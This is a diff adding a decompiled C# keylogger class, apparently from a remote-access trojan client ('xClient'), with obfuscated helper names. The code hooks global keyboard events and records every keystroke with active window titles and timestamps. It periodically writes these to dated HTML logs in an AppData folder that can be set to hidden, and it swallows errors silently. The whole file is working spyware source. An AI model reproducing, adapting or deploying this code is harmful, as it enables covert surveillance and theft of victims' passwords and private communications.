@@ -1,0 +1,257 @@
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Text;
+using System.Timers;
+using System.Windows.Forms;
+using xClient.Core.MouseKeyHook;
+
+namespace xClient.Core.Utilities;
+
+public class Keylogger : IDisposable
+{
+	public static Keylogger Instance;
+
+	private readonly Timer _timerFlush;
+
+	private StringBuilder _logFileBuffer;
+
+	private List<Keys> _pressedKeys = new List<Keys>();
+
+	private List<char> _pressedKeyChars = new List<char>();
+
+	private string _lastWindowTitle;
+
+	private bool _ignoreSpecialKeys;
+
+	private IKeyboardMouseEvents _mEvents;
+
+	public bool IsDisposed { get; private set; }
+
+	public static string LogDirectory => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), GClass0.string_11);
+
+	public Keylogger(double flushInterval)
+	{
+		Instance = this;
+		_lastWindowTitle = string.Empty;
+		_logFileBuffer = new StringBuilder();
+		Subscribe(GClass3.smethod_1());
+		_timerFlush = new Timer
+		{
+			Interval = flushInterval
+		};
+		_timerFlush.Elapsed += timerFlush_Elapsed;
+		_timerFlush.Start();
+		WriteFile();
+	}
+
+	public void Dispose()
+	{
+		Dispose(disposing: true);
+		GC.SuppressFinalize(this);
+	}
+
+	protected virtual void Dispose(bool disposing)
+	{
+		if (!IsDisposed)
+		{
+			if (disposing && _timerFlush != null)
+			{
+				_timerFlush.Stop();
+				_timerFlush.Dispose();
+			}
+			Unsubscribe();
+			IsDisposed = true;
+		}
+	}
+
+	private void Subscribe(IKeyboardMouseEvents events)
+	{
+		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
+		//IL_001e: Expected O, but got Unknown
+		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0035: Expected O, but got Unknown
+		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
+		//IL_004c: Expected O, but got Unknown
+		_mEvents = events;
+		_mEvents.Event_0 += new KeyEventHandler(OnKeyDown);
+		_mEvents.Event_2 += new KeyEventHandler(OnKeyUp);
+		_mEvents.Event_1 += new KeyPressEventHandler(OnKeyPress);
+	}
+
+	private void Unsubscribe()
+	{
+		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0020: Expected O, but got Unknown
+		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0037: Expected O, but got Unknown
+		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
+		//IL_004e: Expected O, but got Unknown
+		if (_mEvents != null)
+		{
+			_mEvents.Event_0 -= new KeyEventHandler(OnKeyDown);
+			_mEvents.Event_2 -= new KeyEventHandler(OnKeyUp);
+			_mEvents.Event_1 -= new KeyPressEventHandler(OnKeyPress);
+			_mEvents.Dispose();
+		}
+	}
+
+	private void OnKeyDown(object sender, KeyEventArgs e)
+	{
+		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
+		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
+		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
+		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
+		string text = GClass51.smethod_4();
+		if (!string.IsNullOrEmpty(text) && text != _lastWindowTitle)
+		{
+			_lastWindowTitle = text;
+			_logFileBuffer.Append("<p class=\"h\"><br><br>[<b>" + GClass51.smethod_2(text) + " - " + DateTime.Now.ToString("HH:mm") + "</b>]</p><br>");
+		}
+		if (_pressedKeys.IsModifierKeysSet() && !_pressedKeys.Contains(e.get_KeyCode()))
+		{
+			_pressedKeys.Add(e.get_KeyCode());
+		}
+		else if (!e.get_KeyCode().IsExcludedKey() && !_pressedKeys.Contains(e.get_KeyCode()))
+		{
+			_pressedKeys.Add(e.get_KeyCode());
+		}
+	}
+
+	private void OnKeyPress(object sender, KeyPressEventArgs e)
+	{
+		if ((_pressedKeys.IsModifierKeysSet() && _pressedKeys.ContainsKeyChar(e.get_KeyChar())) || (_pressedKeyChars.Contains(e.get_KeyChar()) && GClass51.smethod_0(_pressedKeyChars, e.get_KeyChar())) || _pressedKeys.ContainsKeyChar(e.get_KeyChar()))
+		{
+			return;
+		}
+		string value = GClass51.smethod_1(e.get_KeyChar());
+		if (!string.IsNullOrEmpty(value))
+		{
+			if (_pressedKeys.IsModifierKeysSet())
+			{
+				_ignoreSpecialKeys = true;
+			}
+			_pressedKeyChars.Add(e.get_KeyChar());
+			_logFileBuffer.Append(value);
+		}
+	}
+
+	private void OnKeyUp(object sender, KeyEventArgs e)
+	{
+		_logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
+		_pressedKeyChars.Clear();
+	}
+
+	private string HighlightSpecialKeys(Keys[] keys)
+	{
+		if (keys.Length < 1)
+		{
+			return string.Empty;
+		}
+		string[] array = new string[keys.Length];
+		for (int i = 0; i < keys.Length; i++)
+		{
+			if (!_ignoreSpecialKeys)
+			{
+				array[i] = GClass51.smethod_3(keys[i]);
+				continue;
+			}
+			array[i] = string.Empty;
+			_pressedKeys.Remove(keys[i]);
+		}
+		_ignoreSpecialKeys = false;
+		if (_pressedKeys.IsModifierKeysSet())
+		{
+			StringBuilder stringBuilder = new StringBuilder();
+			int num = 0;
+			for (int j = 0; j < array.Length; j++)
+			{
+				_pressedKeys.Remove(keys[j]);
+				if (!string.IsNullOrEmpty(array[j]))
+				{
+					stringBuilder.AppendFormat((num == 0) ? "<p class=\"h\">[{0}" : " + {0}", array[j]);
+					num++;
+				}
+			}
+			if (num > 0)
+			{
+				stringBuilder.Append("]</p>");
+			}
+			return stringBuilder.ToString();
+		}
+		StringBuilder stringBuilder2 = new StringBuilder();
+		for (int k = 0; k < array.Length; k++)
+		{
+			_pressedKeys.Remove(keys[k]);
+			if (string.IsNullOrEmpty(array[k]))
+			{
+				continue;
+			}
+			string text = array[k];
+			if (!(text == "Return"))
+			{
+				if (!(text == "Escape"))
+				{
+					stringBuilder2.Append("<p class=\"h\">[" + array[k] + "]</p>");
+				}
+				else
+				{
+					stringBuilder2.Append("<p class=\"h\">[Esc]</p>");
+				}
+			}
+			else
+			{
+				stringBuilder2.Append("<p class=\"h\">[Enter]</p><br>");
+			}
+		}
+		return stringBuilder2.ToString();
+	}
+
+	private void timerFlush_Elapsed(object sender, ElapsedEventArgs e)
+	{
+		if (_logFileBuffer.Length > 0 && !GClass34.Exiting)
+		{
+			WriteFile();
+		}
+	}
+
+	private void WriteFile()
+	{
+		bool flag = false;
+		string text = Path.Combine(LogDirectory, DateTime.Now.ToString("MM-dd-yyyy"));
+		try
+		{
+			DirectoryInfo directoryInfo = new DirectoryInfo(LogDirectory);
+			if (!directoryInfo.Exists)
+			{
+				directoryInfo.Create();
+			}
+			if (GClass0.bool_4)
+			{
+				directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
+			}
+			if (!File.Exists(text))
+			{
+				flag = true;
+			}
+			StringBuilder stringBuilder = new StringBuilder();
+			if (flag)
+			{
+				stringBuilder.Append("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br><br>");
+				stringBuilder.Append("<style>.h { color: 0000ff; display: inline; }</style>");
+				_lastWindowTitle = string.Empty;
+			}
+			if (_logFileBuffer.Length > 0)
+			{
+				stringBuilder.Append((object?)_logFileBuffer);
+			}
+			GClass42.smethod_7(text, stringBuilder.ToString());
+			stringBuilder.Clear();
+		}
+		catch
+		{
+		}
+		_logFileBuffer.Clear();
+	}
+}
